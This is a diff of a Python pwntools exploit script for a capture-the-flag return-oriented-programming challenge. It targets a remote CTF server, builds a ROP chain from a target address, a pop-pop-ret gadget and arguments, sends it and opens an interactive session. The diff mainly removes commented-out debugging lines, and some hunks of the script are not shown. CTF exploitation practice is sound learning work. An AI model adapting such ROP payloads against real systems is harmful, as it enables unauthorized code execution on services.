@@ -1,9 +1,6 @@
 #!/usr/bin/python
 from pwn import *
-# r = process('./rop_advanced.dms')                       # binary name
 r = remote('ctf99x.cs.ui.ac.id', 9129)
-# libc = ELF('/lib/i386-linux-gnu/libc.so.6')     # libc name
-# libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')     # libc name
 
 target_addr = 0x080491c6
 p1 = 0x12345678
@@ -29,11 +26,7 @@ payload += p32(target_addr)
 payload += p32(pop_pop_ret)
 payload += p32(p111)
 payload += p32(p222)
-# payload += "A"*4
-# print payload
-# fw = open('payload', 'w')
-# fw.write(payload)
-# fw.close()
+
 r.sendline(payload)
-# pause()
+
 r.interactive()
